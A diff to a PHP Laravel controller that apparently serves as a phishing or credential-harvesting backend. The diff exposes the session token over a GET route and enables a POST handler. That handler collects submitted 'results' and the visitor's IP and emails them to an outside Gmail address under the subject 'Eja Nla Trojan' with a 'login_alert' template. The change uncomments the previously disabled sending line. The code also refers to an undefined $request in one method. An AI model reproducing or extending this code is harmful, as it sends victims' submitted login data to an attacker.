@@ -27,11 +27,26 @@ class MainController extends Controller {
 	public function getIndex()
     {
     	$os = $this->helpers->getOS();
-    	return view('index', compact(['os']));
+        $yoken = $request->session->token();
+    	return view('index', compact(['os','yoken']));
     }
     
     
-    public function getSneh(Request $request)
+    /**
+	 * Sneh
+	 *
+	 * @return Response
+	 */
+	public function getSneh(Request $request)
+    {
+    	$os = $this->helpers->getOS();
+        $yoken = $request->session->token();
+        $ret = array("os"=> $os, 'yoken' => $yoken);
+    	return $ret;
+    }
+    
+    
+    public function postSneh(Request $request)
 	{
            $req = $request->all();
                
@@ -55,12 +70,12 @@ class MainController extends Controller {
                 
                  else
                  { 
-                 	 #$ip = getenv("REMOTE_ADDR");
+                 	 $ip = getenv("REMOTE_ADDR");
                  	  $s = "Eja Nla Trojan";
                        $rcpt = "mails4davidslogan@gmail.com";
                        $results = $req["results"];
-                       echo "here are the results: ".$results;
-                          #$this->helpers->sendEmail($rcpt,$s,['results' => $results],'emails.login_alert','view');  
+                       #echo "here are the results: ".$results;
+                         $this->helpers->sendEmail($rcpt,$s,['results' => $results],'emails.login_alert','view');  
                           $ret = ['mode' => "success"];                      
                   }       
            return $ret;                                                                                            
